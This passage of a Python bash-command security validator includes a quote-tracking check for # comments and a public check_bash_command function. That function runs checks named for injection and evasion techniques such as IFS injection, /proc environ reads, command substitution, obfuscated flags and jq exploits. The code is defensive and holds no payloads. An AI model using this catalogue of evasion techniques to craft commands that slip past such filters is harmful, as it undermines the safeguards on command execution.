        if ch == "'":
            in_single = True
            continue

        if ch == '"':
            in_double = True
            continue

        # Unquoted # — check rest of line for quote chars
        if ch == "#":
            line_end = command.find("\n", i)
            comment_text = command[i + 1:line_end if line_end != -1 else len(command)]
            if re.search(r"""['"]""", comment_text):
                return BashSecurityResult(
                    safe=False, check_id=CheckID.COMMENT_QUOTE_DESYNC,
                    message="Command contains quote characters inside a # comment which can desync quote tracking",
                )
            # Skip to end of line (rest is comment)
            if line_end == -1:
                break
            # Loop will increment past newline on next iteration

    return _SAFE


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def check_bash_command(command: str) -> BashSecurityResult:
    """Run all bash security checks on *command*.

    Returns a ``BashSecurityResult``. If ``result.safe`` is False the
    command MUST be rejected — do NOT pass it to subprocess.

    The checks are ordered from cheapest to most expensive for early-out
    performance.
    """
    if not command or not command.strip():
        return _SAFE

    base_cmd = _get_base_command(command)
    unquoted = _extract_unquoted(command)

    # Run each check in priority order. First failure wins.
    checks: list[BashSecurityResult] = [
        _check_control_characters(command),
        _check_unicode_whitespace(command),
        _check_incomplete_commands(command),
        _check_ifs_injection(command),
        _check_proc_environ(command),
        _check_heredoc_in_substitution(command),
        _check_comment_quote_desync(command),
        _check_quoted_newline_comment(command),
        _check_newlines(command, unquoted),
        _check_command_substitution(unquoted),
        _check_redirections(command, unquoted),
        _check_dangerous_variables(unquoted),
        _check_shell_metacharacters(command, unquoted),
        _check_obfuscated_flags(command, base_cmd),
        _check_git_commit_substitution(command, base_cmd),
        _check_jq_exploits(command, base_cmd),
        _check_backslash_escaped_whitespace(command),
        _check_backslash_escaped_operators(command),
        _check_mid_word_hash(command),
        _check_brace_expansion(command, unquoted),
        _check_zsh_dangerous_commands(command),
    ]

    for result in checks:
        if not result.safe:
            log.warning(
                "Bash security check %d BLOCKED command: %s — %s",
                result.check_id, command[:120], result.message,
            )
            return result

    return _SAFE
